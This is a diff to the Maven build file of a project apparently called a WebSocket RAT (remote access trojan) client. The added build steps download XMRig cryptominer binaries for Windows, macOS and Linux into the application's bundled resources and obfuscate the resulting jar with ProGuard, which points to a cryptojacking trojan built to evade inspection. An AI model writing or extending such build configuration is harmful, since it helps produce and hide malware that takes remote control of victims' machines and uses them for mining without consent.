@@ -12,6 +12,8 @@
 	<properties>
 		<rat-client.mainClass>io.github.machineswillrise.websocketrat.client.WebSocketRatClient</rat-client.mainClass>
 		<jna.version>5.19.1</jna.version>
+		<download.version>2.1.0</download.version>
+		<classpath>${project.build.directory}/src/main/resources</classpath>
 	</properties>
 
 	<dependencies>
@@ -60,16 +62,6 @@
 			<plugin>
 				<groupId>org.apache.maven.plugins</groupId>
 				<artifactId>maven-assembly-plugin</artifactId>
-				<configuration>
-					<archive>
-						<manifest>
-							<mainClass>${rat-client.mainClass}</mainClass>
-						</manifest>
-					</archive>
-					<descriptorRefs>
-						<descriptorRef>jar-with-dependencies</descriptorRef>
-					</descriptorRefs>
-				</configuration>
 				<executions>
 					<execution>
 						<id>make-assembly</id>
@@ -77,6 +69,16 @@
 						<goals>
 							<goal>single</goal>
 						</goals>
+						<configuration>
+							<archive>
+								<manifest>
+									<mainClass>${rat-client.mainClass}</mainClass>
+								</manifest>
+							</archive>
+							<descriptorRefs>
+								<descriptorRef>jar-with-dependencies</descriptorRef>
+							</descriptorRefs>
+						</configuration>
 					</execution>
 				</executions>
 			</plugin>
@@ -86,24 +88,163 @@
 				<artifactId>native-maven-plugin</artifactId>
 				<version>1.1.9</version>
 				<extensions>true</extensions>
+
 				<executions>
 					<execution>
-						<id>compile-native</id>
+						<phase>package</phase>
 						<goals>
 							<goal>compile-no-fork</goal>
 						</goals>
-						<phase>package</phase>
+						<configuration>
+							<mainClass>${rat-client.mainClass}</mainClass>
+						</configuration>
 					</execution>
 				</executions>
-				<configuration>
-						<mainClass>${rat-client.mainClass}</mainClass>
-				</configuration>
 			</plugin>
 
 			<plugin>
 				<groupId>org.apache.maven.plugins</groupId>
 				<artifactId>maven-resources-plugin</artifactId>
 			</plugin>
+
+			<plugin>
+				<groupId>io.github.download-maven-plugin</groupId>
+				<artifactId>download-maven-plugin</artifactId>
+				<version>${download.version}</version>
+				<executions>
+					<execution>
+						<id>download-xmrig-windows</id>
+						<phase>process-resources</phase>
+						<goals>
+							<goal>wget</goal>
+						</goals>
+
+						<configuration>
+							<url>https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-gcc-x64.zip</url>
+							<md5>a3290a7bf02e410b530e24df2a599938</md5>
+							<outputFileName>xmrig-windows.zip</outputFileName>
+							<outputDirectory>${classpath}</outputDirectory>
+						</configuration>
+					</execution>
+
+					<execution>
+						<id>download-xmrig-macos</id>
+						<phase>process-resources</phase>
+						<goals>
+							<goal>wget</goal>
+						</goals>
+
+						<configuration>
+							<url>https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-macos-arm64.tar.gz</url>
+							<md5>32e63993bc19b155224cf78b55df1fa6</md5>
+							<outputFileName>xmrig-macos.tar.gz</outputFileName>
+							<outputDirectory>${classpath}</outputDirectory>
+						</configuration>
+					</execution>
+
+					<execution>
+						<id>download-xmrig-linux</id>
+						<phase>process-resources</phase>
+						<goals>
+							<goal>wget</goal>
+						</goals>
+
+						<configuration>
+							<url>https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz</url>
+							<md5>3988ac93e8e894b74de7794c93d3ff7d</md5>
+							<outputFileName>xmrig-linux.tar.gz</outputFileName>
+							<outputDirectory>${classpath}</outputDirectory>
+						</configuration>
+					</execution>
+				</executions>
+			</plugin>
+
+			<plugin>
+				<groupId>org.apache.maven.plugins</groupId>
+				<artifactId>maven-clean-plugin</artifactId>
+				<version>3.5.0</version>
+
+				<configuration>
+					<filesets>
+						<fileset>
+							<directory>${classpath}</directory>
+							<includes>
+								<include>xmrig-windows.zip</include>
+								<include>xmrig-macos.tar.gz</include>
+								<include>xmrig-linux.tar.gz</include>
+							</includes>
+						</fileset>
+					</filesets>
+				</configuration>
+			</plugin>
+
+			<plugin>
+				<groupId>com.github.wvengen</groupId>
+				<artifactId>proguard-maven-plugin</artifactId>
+				<version>2.7.0</version>
+
+				<executions>
+					<execution>
+						<phase>package</phase>
+						<goals>
+							<goal>proguard</goal>
+						</goals>
+
+						<configuration>
+							<obfuscate>true</obfuscate>
+
+							<injar>${project.build.finalName}</injar>
+							<outjar>${project.build.finalName}-obfuscated.jar</outjar>
+							<outputDirectory>${project.build.directory}</outputDirectory>
+
+							<libs>
+								<lib>${java.home}/lib/rt.jar</lib>
+								<lib>${java.home}/lib/jsse.jar</lib>
+							</libs>
+						</configuration>
+					</execution>
+				</executions>
+
+				<dependencies>
+					<dependency>
+						<groupId>com.guardsquare</groupId>
+						<artifactId>proguard-base</artifactId>
+						<version>7.10.0</version>
+						<scope>runtime</scope>
+					</dependency>
+				</dependencies>
+			</plugin>
 		</plugins>
+
+		<pluginManagement>
+			<plugins>
+				<plugin>
+					<groupId>org.eclipse.m2e</groupId>
+					<artifactId>lifecycle-mapping</artifactId>
+					<configuration>
+						<lifecycleMappingMetadata>
+							<pluginExecutions>
+								<pluginExecution>
+									<pluginExecutionFilter>
+										<groupId>io.github.download-maven-plugin</groupId>
+										<artifactId>download-maven-plugin</artifactId>
+										<versionRange>[${download.version},)</versionRange>
+
+										<goals>
+											<goal>wget</goal>
+										</goals>
+									</pluginExecutionFilter>
+									<action>
+										<execute>
+											<runOnIncremental>false</runOnIncremental>
+										</execute>
+									</action>
+								</pluginExecution>
+							</pluginExecutions>
+						</lifecycleMappingMetadata>
+					</configuration>
+				</plugin>
+			</plugins>
+		</pluginManagement>
 	</build>
 </project>
